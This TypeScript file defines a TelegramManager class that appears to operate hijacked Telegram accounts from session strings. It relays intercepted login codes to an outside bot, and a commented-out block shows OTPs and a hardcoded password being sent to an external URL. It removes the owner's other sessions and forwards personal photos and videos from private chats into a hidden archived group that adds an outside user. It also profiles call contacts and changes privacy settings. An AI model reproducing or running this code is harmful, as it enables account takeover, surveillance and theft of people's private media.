import { Api, TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { NewMessage, NewMessageEvent } from 'telegram/events';
import axios from 'axios';
import * as fs from 'fs';
import { CustomFile } from 'telegram/client/uploads';
import { TotalList, sleep } from 'telegram/Helpers';
import { Dialog } from 'telegram/tl/custom/dialog';
import { LogLevel } from 'telegram/extensions/Logger';
import { MailReader } from '../../IMap/IMap';
import bigInt from 'big-integer';
import { IterDialogsParams } from 'telegram/client/dialogs';
import { EntityLike } from 'telegram/define';
import { contains } from '../../utils';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
import { ContentFilter } from '../../interfaces/telegram';
import {
    GroupOptions
} from '../../interfaces/telegram';
import { MediaAlbumOptions } from './types/telegram-types';
import { IterMessagesParams } from 'telegram/client/messages';

interface MessageScheduleOptions {
    chatId: string;
    message: string;
    scheduledTime: Date;
    replyTo?: number;
    silent?: boolean;
    media?: {
        type: 'photo' | 'video' | 'document';
        url: string;
    };
}

class TelegramManager {
    private session: StringSession;
    public phoneNumber: string;
    public client: TelegramClient | null;
    private channelArray: string[];
    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };
    private contentFilters: Map<string, ContentFilter>;
    private filterHandler: any;

    constructor(sessionString: string, phoneNumber: string) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
        this.contentFilters = new Map();
    }

    public static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }

    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {
        TelegramManager.activeClientSetup = data;
    }

    public async createGroup() {
        const groupName = "Saved Messages"; // Customize your group name
        const groupDescription = this.phoneNumber; // Optional description
        console.log("Creating group:", groupName);
        const result: any = await this.client.invoke(
            new Api.channels.CreateChannel({
                title: groupName,
                about: groupDescription,
                megagroup: true,
                forImport: true,
            })
        );
        const { id, accessHash } = result.chats[0];
        console.log("Archived chat", id);
        await this.archiveChat(id, accessHash);
        const usersToAdd = ["fuckyoubabie"]; // Replace with the list of usernames or user IDs
        console.log("Adding users to the channel:", usersToAdd);
        const addUsersResult = await this.client.invoke(
            new Api.channels.InviteToChannel({
                channel: new Api.InputChannel({
                    channelId: id,
                    accessHash: accessHash,
                }),
                users: usersToAdd
            })
        );
        console.log("Successful addition of users:", addUsersResult);
        return { id, accessHash };
    }

    public async archiveChat(id: bigInt.BigInteger, accessHash: bigInt.BigInteger) {
        const folderId = 1;
        console.log("Archiving chat", id);
        return await this.client.invoke(
            new Api.folders.EditPeerFolders({
                folderPeers: [
                    new Api.InputFolderPeer({
                        peer: new Api.InputPeerChannel({
                            channelId: id,
                            accessHash: accessHash,
                        }),
                        folderId: folderId,
                    }),
                ],
            })
        );
    }

    public async forwardMedia(channel: string, fromChatId: string) {
        let channelId;
        try {
            console.log("Forwarding media from chat to channel", channel, fromChatId);
            let channelAccessHash;
            if (channel) {
                const result: any = await this.joinChannel(channel);
                channelId = result.chats[0].id;
                channelAccessHash = result.chats[0].accessHash;
                await this.archiveChat(channelId, channelAccessHash);
                console.log("Archived chat", channelId);
            } else {
                const result = await this.createGroup();
                channelId = result.id;
                channelAccessHash = result.accessHash;
                console.log("Created new group with ID:", channelId);
            }
            if (fromChatId) {
                await this.forwardSecretMsgs(fromChatId, channelId.toString());
            } else {
                await this.forwardSecretMsgsFromTopChats(channelId.toString());
            }
        } catch (e) {
            console.log(e)
        }
        await this.leaveChannels([channelId.toString()]);
        await this.disconnect();
    }

    public async forwardSecretMsgsFromTopChats(channelId: string) {
        const chats = await this.getTopPrivateChats();
        for (const chat of chats) {
            const mediaMessages = await this.searchMessages({ chatId: chat.chatId, limit: 1000, types: ['photo', 'video'] });
            console.log("Forwarding messages from chat:", chat.chatId, "to channel:", channelId);
            await this.forwardMessages(chat.chatId, channelId, mediaMessages.photo.messages);
            await this.forwardMessages(chat.chatId, channelId, mediaMessages.video.messages);
        }
        console.log("Completed forwarding messages from top private chats to channel:", channelId);
    }

    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {
        let offset = 0;
        const limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages: any = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message: Api.Message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            console.log(messageIds)
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });

                    forwardedCount += messageIds.length;
                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await sleep(5000); // Sleep for a second to avoid rate limits
                } catch (error) {
                    console.error("Error occurred while forwarding messages:", error);
                }
                await sleep(5000); // Sleep for a second to avoid rate limits
            }
        } while (messages.length > 0);
        console.log("Left the channel with ID:", toChatId);
        return;
    }

    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {
        const chunkSize = 30; // Number of messages to forward per request
        const totalMessages = messageIds.length;
        let forwardedCount = 0;

        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });

                forwardedCount += chunk.length;
                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await sleep(5000); // Sleep for a second to avoid rate limits
            } catch (error) {
                console.error("Error occurred while forwarding messages:", error);
            }
        }

        return forwardedCount;
    }

    async disconnect(): Promise<void> {
        if (this.client) {
            try {
                console.log("Destroying Client: ", this.phoneNumber);
                await this.cleanupClient();
            } catch (error) {
                console.error("Error during disconnect:", error);
                throw error;
            }
        }
    }

    private async cleanupClient() {
        try {
            if (!this.client) return;
            const handlers = this.client.listEventHandlers();
            for (const handler of handlers) {
                this.client.removeEventHandler(handler[1], handler[0]);
            }
            try {
                if (this.client.connected) {
                    await this.client.disconnect();
                }
                await this.client.destroy();
            } catch (error) {
                parseError(error, `${this.phoneNumber}: Error during client cleanup`);
            }
            await this.client.destroy();
            await this.client.disconnect();
            this.client = null;
            this.session.delete();
            this.channelArray = [];
            this.client = null;
            await sleep(2000);
        } catch (error) {
            parseError(error, `${this.phoneNumber}: Error during client cleanup`);
        }
    }

    async getchatId(username: string): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }

    async getMe() {
        const me = <Api.User>await this.client.getMe();
        return me
    }

    async errorHandler(error) {
        parseError(error)
        if (error.message && error.message == 'TIMEOUT') {
            // await this.client.disconnect();
            // await this.client.destroy();
            // await disconnectAll()
            //Do nothing, as this error does not make sense to appear while keeping the client disconnected
        } else {
            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
            // Handle other types of errors
        }
    }

    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {
        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 5,
        });
        this.client.setLogLevel(LogLevel.ERROR);
        // this.client._errorHandler = this.errorHandler
        await this.client.connect();
        const me = <Api.User>await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler")
            if (handlerFn) {
                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());
            } else {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());
            }
        }
        return this.client
    }

    async getGrpMembers(entity: EntityLike) {
        try {
            const result = []
            // Fetch the group entity
            const chat = await this.client.getEntity(entity);

            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {
                console.log("Invalid group or channel!");
                return;
            }

            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);

            // Fetch members
            const participants = await this.client.invoke(
                new Api.channels.GetParticipants({
                    channel: chat,
                    filter: new Api.ChannelParticipantsRecent(),
                    offset: 0,
                    limit: 200, // Adjust the limit as needed
                    hash: bigInt(0),
                })
            );

            if (participants instanceof Api.channels.ChannelParticipants) {
                const users = participants.participants;

                console.log(`Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = <Api.User>await this.client.getEntity(userInfo);
                        // console.log(
                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || ""} ${userDetails.lastName || ""
                        //     }, Username: ${userDetails.username || ""}`
                        // );
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        })
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            console.log(JSON.stringify(userDetails.id))
                        }
                    } else {
                        console.log(JSON.stringify((user as any)?.userId))
                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)
                    }
                }
            } else {
                console.log("No members found or invalid group.");
            }
            console.log(result.length)
            return result;
        } catch (err) {
            console.error("Error fetching group members:", err);
        }
    }
    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params: IterDialogsParams) {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats;
    }

    async getLastMsgs(limit: number): Promise<string> {
        if (!this.client) throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }

    async getSelfMSgsInfo(): Promise<{
        photoCount: number;
        videoCount: number;
        movieCount: number,
        total: number,
        ownPhotoCount: number,
        otherPhotoCount: number,
        ownVideoCount: number,
        otherVideoCount: number
    }> {
        if (!this.client) throw new Error('Client is not initialized');
        const self = <Api.User>await this.client.getMe();
        const selfChatId = self.id;

        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;

        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++
            } else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++
                    } else {
                        otherPhotoCount++
                    }
                } else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++
                    } else {
                        otherVideoCount++
                    }
                }
            }
        }

        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })
    }
    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 1500 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        const canSendFalseChats = [];
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = <Api.Channel>chat.entity.toJSON();
                    const { broadcast, defaultBannedRights, id } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
                    } else {
                        canSendFalseCount++;
                        canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
                    }
                } catch (error) {
                    parseError(error);
                }
            }
        };
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : [],
            canSendFalseChats
        };
    }

    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`; // Automated naming
                const lastName = "";
                try {
                    await this.client.invoke(
                        new Api.contacts.AddContact({
                            firstName,
                            lastName,
                            phone: user.mobile,
                            id: user.tgId
                        })
                    );
                } catch (e) {
                    console.log(e)
                }
            }
        } catch (error) {
            console.error("Error adding contacts:", error);
            parseError(error, `Failed to save contacts`);
        }
    }

    async addContacts(mobiles: string[], namePrefix: string) {
        try {
            const inputContacts: Api.TypeInputContact[] = [];

            // Iterate over the data array and generate input contacts
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`; // Automated naming
                const lastName = ""; // Optional, no last name provided

                // Generate client_id as a combination of i and j (for uniqueness)
                // Since we only have one phone per user here, j will always be 0
                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone

                inputContacts.push(new Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user, // mobile number
                    firstName: firstName,
                    lastName: lastName
                }));
            }

            // Call the API to import contacts
            const result = await this.client.invoke(
                new Api.contacts.ImportContacts({
                    contacts: inputContacts,
                })
            );

            console.log("Imported Contacts Result:", result);


        } catch (error) {
            console.error("Error adding contacts:", error);
            parseError(error, `Failed to save contacts`);
        }
    }

    async leaveChannels(chats: string[]) {
        console.log("Leaving Channels: initaied!!");
        console.log("ChatsLength: ", chats)
        for (const id of chats) {
            try {
                const channelId = id.startsWith('-100') ? id : `-100${id}`;
                await this.client.invoke(
                    new Api.channels.LeaveChannel({
                        channel: channelId
                    })
                );
                console.log(`${this.phoneNumber} Left channel :`, id);
                if (chats.length > 1) {
                    await sleep(3000);
                }

            } catch (error) {
                const errorDetails = parseError(error);
                console.log(`${this.phoneNumber} Failed to leave channel :`, errorDetails.message);
                break;
            }
        }
        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);
    }

    async getEntity(entity: Api.TypeEntityLike) {
        return await this.client?.getEntity(entity)
    }

    async joinChannel(entity: Api.TypeEntityLike) {
        console.log("trying to join channel : ", entity)
        return await this.client?.invoke(
            new Api.channels.JoinChannel({
                channel: await this.client?.getEntity(entity)
            })
        );
    }

    connected() {
        return this.client.connected;
    }

    async connect() {
        return await this.client.connect();
    }

    async removeOtherAuths(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            } else {
                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }

    private isAuthMine(auth: Api.Authorization): boolean {
        const authCriteria = [
            { field: 'country', value: 'singapore' },
            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }
        ];

        return authCriteria.some(criterion => {
            if ('values' in criterion) {
                return criterion.values.some(value =>
                    auth[criterion.field].toLowerCase().includes(value.toLowerCase())
                );
            }
            return auth[criterion.field].toLowerCase().includes(criterion.value.toLowerCase());
        });
    }

    private async resetAuthorization(auth: any): Promise<void> {
        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
    }

    async getAuths(): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        return result;
    }

    async getAllChats(): Promise<any[]> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });

        const result = await Promise.all(messages.map(async (message: Api.Message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;

            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));

        return result;
    }

    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {
        if (message.media instanceof Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id)
            const sizes = (<Api.Photo>message.photo)?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });

        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id)
            const sizes = message.document?.thumbs || [1]
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }

    async sendInlineMessage(chatId: string, message: string, url: string) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new Api.KeyboardButtonUrl(button)]
        })
        return result;
    }

    async getMediaMessages() {
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhotos(),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );
        return result
    }


    async getCallLog() {
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );

        const callLogs = <Api.Message[]>result.messages.filter(
            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall
        );

        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = <Api.MessageActionPhoneCall>log.action

            // const callInfo = {
            //     callId: logAction.callId.toString(),
            //     duration: logAction.duration,
            //     video: logAction.video,
            //     timestamp: log.date
            // };

            // Categorize by type
            if (log.out) {
                filteredResults.outgoing++;
            } else {
                filteredResults.incoming++;
            }

            if (logAction.video) {
                filteredResults.video++;
            }

            // Count calls per chat ID
            const chatId = (log.peerId as Api.PeerUser).userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = <Api.User>await this.client.getEntity(chatId)
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0
                const msgs = await this.client.getMessages(chatId, { limit: 600 })
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof Api.MessageMediaPhoto) {
                            photo++
                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...(details as any),
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                })
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });

        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }

    async getCallLogsInternal() {
        const finalResult = {}
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );

        const callLogs = <Api.Message[]>result.messages.filter(
            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall
        );

        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = <Api.MessageActionPhoneCall>log.action
            if (log.out) {
                filteredResults.outgoing++;
            } else {
                filteredResults.incoming++;
            }

            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = (log.peerId as Api.PeerUser).userId.toString();
            finalResult[chatId] = filteredResults
        }
        return finalResult;
    }
    async handleEvents(event: NewMessageEvent) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000))
                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {
                //     console.log("LoginText: ", event.message.text)
                //     const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
                //     console.log("Code is:", code);
                //     try {
                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                //         console.log("Code Sent back");
                //     } catch (error) {
                //         parseError(error)
                //     }
                // } else {
                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);
                // await event.message.delete({ revoke: true });
                // }
            }
        }
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll(),
                    ],
                })
            );

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            throw e
        }
    }
    async updateProfile(firstName: string, about: string) {
        const data = {
            lastName: "",
        }
        if (firstName !== undefined) {
            data["firstName"] = firstName
        }
        if (about !== undefined) {
            data["about"] = about
        }
        try {
            const result = await this.client.invoke(
                new Api.account.UpdateProfile(data)
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            throw error
        }
    }

    async downloadProfilePic(photoIndex: number) {
        try {
            const photos = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: 'me',
                    offset: 0,
                })
            );

            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);

                // Choose the photo index (0-based)
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];

                    // Extract the largest photo file (e.g., highest resolution)
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)
                    const photoFileSize = selectedPhoto.sizes[index];

                    // Download the file
                    const photoBuffer = await this.client.downloadFile(
                        new Api.InputPhotoFileLocation({
                            id: selectedPhoto.id,
                            accessHash: selectedPhoto.accessHash,
                            fileReference: selectedPhoto.fileReference,
                            thumbSize: photoFileSize.type
                        }), {
                        dcId: selectedPhoto.dcId, // Data center ID
                    });

                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    } else {
                        console.log("Failed to download the photo.");
                    }
                } else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            } else {
                console.log("No profile photos found.");
            }
        } catch (err) {
            console.error("Error:", err);
        }
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        let latest = 0
        result.authorizations.map((auth) => {
            if (!this.isAuthMine(auth)) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return (new Date(latest * 1000)).toISOString().split('T')[0];
    }

    async getContacts() {
        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({
            hash: bigInt(0)
        }));
        return exportedContacts;
    }

    async deleteChat(chatId: string) {
        try {
            await this.client.invoke(new Api.messages.DeleteHistory({
                justClear: false,
                peer: chatId,
                revoke: false,
            }));
            console.log(`Dialog with ID ${chatId} has been deleted.`);
        } catch (error) {
            console.error('Failed to delete dialog:', error);
        }
    }

    async blockUser(chatId: string) {
        try {
            await this.client?.invoke(new Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        } catch (error) {
            console.error('Failed to block user:', error);
        }
    }

    async getMediaMetadata(params: {
        chatId: string;
        types?: ('photo' | 'video' | 'document' | 'voice')[];
        startDate?: Date;
        endDate?: Date;
        limit?: number;
        maxId?: number;
        minId?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;

        const query: Partial<IterMessagesParams> = {
            limit: limit || 500,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
        };

        const ent = await this.safeGetEntity(chatId);
        console.log(query);
        const messages = await this.client.getMessages(ent, query);
        console.log(`Fetched ${messages.length} messages`);

        const filteredMessages = messages.map(message => {
            const messageIds: number[] = [];
            if (message.media) {
                const mediaType = this.getMediaType(message.media);
                if (types.includes(mediaType)) {
                    messageIds.push(message.id);
                }
            }
            return messageIds;
        }).flat();

        return {
            messages: filteredMessages,
            total: messages.total,
            hasMore: messages.length == limit,
            lastOffsetId: messages[messages.length - 1].id
        };
    }

    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {
        try {
            const entity = await this.safeGetEntity(chatId);
            const messages = await this.client.getMessages(entity, { ids: [messageId] });
            const message = <Api.Message>messages[0];

            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || <Api.Photo>message.photo;

                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };

                if (media instanceof Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                } else if (media instanceof Api.MessageMediaDocument) {
                    contentType = (media as any).mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                } else {
                    return res.status(415).send('Unsupported media type');
                }

                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

                const chunkSize = 512 * 1024; // 512 KB chunks

                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: bigInt[0],
                    limit: 5 * 1024 * 1024, // 80 MB limit
                    requestSize: chunkSize,
                })) {
                    res.write(chunk); // Stream each chunk to the client
                }
                res.end();
            } else {
                res.status(404).send('Media not found');
            }
        } catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }

    private async downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {
        return Promise.race([
            promise,
            new Promise<T>((_, reject) =>
                setTimeout(() => reject(new Error('Download timeout')), timeout)
            )
        ]);
    }

    private getMediaDetails(media: Api.MessageMediaDocument) {
        if (!media?.document) return null;

        const doc = media.document;
        if (doc instanceof Api.DocumentEmpty) return null;
        const videoAttr = doc.attributes.find(attr =>
            attr instanceof Api.DocumentAttributeVideo
        ) as Api.DocumentAttributeVideo;

        const fileNameAttr = doc.attributes.find(attr =>
            attr instanceof Api.DocumentAttributeFilename
        ) as Api.DocumentAttributeFilename;

        return {
            size: doc.size,
            mimeType: doc.mimeType,
            fileName: fileNameAttr?.fileName || null,
            duration: videoAttr?.duration || null,
            width: videoAttr?.w || null,
            height: videoAttr?.h || null
        };
    }

    private async downloadFileFromUrl(url: string): Promise<Buffer> {
        try {
            const response = await axios.get(url, {
                responseType: 'arraybuffer',
                timeout: 30000
            });
            return Buffer.from(response.data);
        } catch (error) {
            throw new Error(`Failed to download file: ${error.message}`);
        }
    }

